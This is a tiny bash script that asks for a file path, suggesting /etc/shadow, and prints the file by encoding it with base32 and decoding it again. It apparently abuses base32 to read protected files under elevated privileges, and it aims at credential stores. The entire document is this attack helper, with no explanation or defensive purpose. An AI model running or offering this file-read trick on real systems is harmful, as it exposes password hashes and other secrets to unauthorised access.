#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
base32 "$filepath" | base32 --decode
